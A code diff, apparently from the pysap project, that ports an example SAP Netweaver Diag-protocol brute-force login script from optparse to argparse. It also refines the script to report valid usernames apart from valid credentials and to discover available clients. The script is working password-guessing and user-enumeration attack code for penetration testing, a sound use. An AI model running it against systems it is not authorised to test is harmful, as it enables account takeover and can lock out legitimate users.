@@ -22,7 +22,7 @@
 import logging
 from string import letters
 from random import choice
-from optparse import OptionParser, OptionGroup
+from argparse import ArgumentParser
 # External imports
 from scapy.config import conf
 from scapy.packet import bind_layers
@@ -55,55 +55,44 @@ def parse_options():
 
     description = "This example script can be used to perform a brute force attack against a SAP Netweaver " \
                   "application server. The scripts performs a login through the Diag protocol. It can also discover " \
-                  "available clients."
+                  "available clients. Consider that this can lock out user accounts and run it at your own risk."
 
-    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
-                                                         "url": pysap.__url__,
-                                                         "repo": pysap.__repo__}
+    usage = "%(prog)s [options] -d <remote host>"
 
-    usage = "Usage: %prog [options] -d <remote host>"
+    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)
 
-    parser = OptionParser(usage=usage, description=description, epilog=epilog)
+    target = parser.add_argument_group("Target")
+    target.add_argument("-d", "--remote-host", dest="remote_host",
+                        help="Remote host")
+    target.add_argument("-p", "--remote-port", dest="remote_port", type=int, default=3200,
+                        help="Remote port [%(default)d]")
+    target.add_argument("--route-string", dest="route_string",
+                        help="Route string for connecting through a SAP Router")
 
-    target = OptionGroup(parser, "Target")
-    target.add_option("-d", "--remote-host", dest="remote_host",
-                      help="Remote host")
-    target.add_option("-p", "--remote-port", dest="remote_port", type="int", default=3200,
-                      help="Remote port [%default]")
-    target.add_option("--route-string", dest="route_string",
-                      help="Route string for connecting through a SAP Router")
-    parser.add_option_group(target)
+    credentials = parser.add_argument_group("Credentials")
+    credentials.add_argument("-u", "--usernames", dest="usernames", metavar="FILE",
+                             help="Usernames file")
+    credentials.add_argument("-l", "--passwords", dest="passwords", metavar="FILE",
+                             help="Passwords file")
+    credentials.add_argument("-m", "--client", dest="client", default="000,001,066",
+                             help="Client number [%(default)s]")
+    credentials.add_argument("-c", "--credentials", dest="credentials", metavar="FILE",
+                             help="Credentials file (username:password:client)")
 
-    credentials = OptionGroup(parser, "Credentials")
-    credentials.add_option("-u", "--usernames", dest="usernames", metavar="FILE",
-                           help="Usernames file")
-    credentials.add_option("-l", "--passwords", dest="passwords", metavar="FILE",
-                           help="Passwords file")
-    credentials.add_option("-m", "--client", dest="client", default="000,001,066",
-                           help="Client number [%default]")
-    credentials.add_option("-c", "--credentials", dest="credentials", metavar="FILE",
-                           help="Credentials file (username:password:client)")
-    credentials.add_option("-t", "--max-tries", dest="max_tries",
-                           help="Max tries per username")
-    parser.add_option_group(credentials)
+    discovery = parser.add_argument_group("Clients Discovery")
+    discovery.add_argument("--discovery", dest="discovery", action="store_true",
+                           help="Performs discovery of available clients")
+    discovery.add_argument("--discovery-range", dest="discovery_range", default="000-099",
+                           help="Client range for the discovery of available clients [%(default)s]")
 
-    discovery = OptionGroup(parser, "Clients Discovery")
-    discovery.add_option("--discovery", dest="discovery", action="store_true", default=False,
-                         help="Performs discovery of available clients [%default]")
-    discovery.add_option("--discovery-range", dest="discovery_range", default="000-099",
-                         help="Client range for the discovery of available clients [%default]")
-    parser.add_option_group(discovery)
+    misc = parser.add_argument_group("Misc options")
+    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")
+    misc.add_argument("--threads", dest="threads", type=int, default=1,
+                      help="Number of threads [%(default)d]")
+    misc.add_argument("--terminal", dest="terminal", default=None,
+                      help="Terminal name")
 
-    misc = OptionGroup(parser, "Misc options")
-    misc.add_option("--threads", dest="threads", type="int", default=1,
-                    help="Number of threads [%default]")
-    misc.add_option("-v", "--verbose", dest="verbose", action="store_true", default=False,
-                    help="Verbose output [%default]")
-    misc.add_option("--terminal", dest="terminal", default=None,
-                    help="Terminal name")
-    parser.add_option_group(misc)
-
-    (options, _) = parser.parse_args()
+    options = parser.parse_args()
 
     if not (options.remote_host or options.route_string):
         parser.error("Remote host or route string is required")
@@ -151,11 +140,11 @@ def is_duplicate_login(response):
 
 
 def login(host, port, terminal, route, username, password, client, verbose, results):
+    """Perform a login try with the username and password. Tries to determine if either the username
+    or the combination of username and password is valid for the given client.
     """
-    Perform a login try with the username and password.
-
-    """
-    success = False
+    user_valid = False
+    login_success = False
     status = ''
 
     # Create the connection to the SAP Netweaver server
@@ -170,29 +159,31 @@ def login(host, port, terminal, route, username, password, client, verbose, resu
         status = response[SAPDiag].get_item("APPL", "ST_R3INFO", "MESSAGE")[0].item_value
         # Check if the password is expired
         if status == "Enter a new password":
-            success = True
+            user_valid = login_success = True
             status = "Expired password"
         elif status == "E: Log on with a dialog user":
-            success = True
+            user_valid = True
+            login_success = False
             status = "No Dialog user (log on with RFC)"
         elif status[:10] == "E: Client ":
-            success = False
+            user_valid = login_success = False
             status = "Client does not exist"
     # Check if the user is already logged in
     elif is_duplicate_login(response)[0]:
         status = is_duplicate_login(response)[1]
-        success = True
+        user_valid = login_success = True
     # If the ST_USER USERNAME item is set to the username, the login was successful
     elif response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME"):
         st_username = response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME")[0].item_value
         if st_username == username:
-            success = True
+            user_valid = login_success = True
     # If the response doesn't contain a message item but the Internal Mode Number is set to 1, we have found a
     # successful login
     elif response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER"):
         imodenumber = response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER")[0].item_value
         if imodenumber == "\x00\x01":
-            success = True
+            user_valid = login_success = True
+
     # Otherwise, we are dealing with an unknown response
     else:
         status = "Unknown error"
@@ -201,34 +192,32 @@ def login(host, port, terminal, route, username, password, client, verbose, resu
     connection.close()
 
     if verbose:
-        print("[*] Results: \tClient: %s\tUsername: %s\tPassword: %s\tValid: %s\tStatus: %s" % (client, username,
-                                                                                                password, success,
-                                                                                                status))
-    results.append((success, status, username, password, client))
+        print("[*] Results: \tClient: %s\tUsername: %s\tPassword: %s\t"
+              "Username Valid: %s\tPassword Valid: %s\tStatus: %s" % (client, username, password,
+                                                                      user_valid, login_success,
+                                                                      status))
+    results.append((user_valid, login_success, status, username, password, client))
 
 
 def discover_client(host, port, terminal, route, client, verbose, results):
     """
     Test if a client is available on the application server, by setting the client and using a
     random username/password, and looking at the response's message.
-
     """
-
-    # Unavailable client
-    unavailable = "E: Client %s is not available in this system"
-
-    # If there's a license issue, all clients report this
-    license_check = "E: Logon not possible (error in license check)"
 
     client = "%03d" % client
     login_results = []
     login(host, port, terminal, route, get_rand(8), get_rand(8), client, verbose, login_results)
-    (_, status, _, _, client) = login_results[0]
+    (_, _, status, _, _, client) = login_results[0]
 
-    if status == license_check:
+    # Check for the positive signs that the client doesn't exist
+    unavailable = "E: Client %s is not available in this system"
+    unexistent = "Client does not exist"
+    license_check = "E: Logon not possible (error in license check)"
+    if status in [license_check, unavailable % client, unexistent]:
         available = False
-    elif status == unavailable % client:
-        available = False
+
+    # Otherwise assume the client does exist to be on the safe side
     else:
         available = True
 
@@ -268,7 +257,7 @@ def main():
             if success:
                 client_list.append(client)
 
-        print("[*] Clients found: %s" % ','.join(client_list))
+        print("[*] Clients found potentially available: %s" % ','.join(client_list))
     else:
         print("[*] Not discovering clients, using %s or client supplied in credentials file" % options.client)
         client_list = options.client.split(',')
@@ -336,8 +325,12 @@ def main():
     pool.wait_completion()
 
     # Print the credentials found
-    for (success, status, username, password, client) in results:
-        if success:
+    for (user_valid, login_success, status, username, password, client) in results:
+        if user_valid and not login_success:
+            print("[+] Valid username found: \tClient: %s\tUsername: %s\tStatus: %s" % (client,
+                                                                                        username,
+                                                                                        status))
+        elif login_success:
             print("[+] Valid credentials found: \tClient: %s\tUsername: %s\tPassword: %s\tStatus: %s" % (client,
                                                                                                          username,
                                                                                                          password,
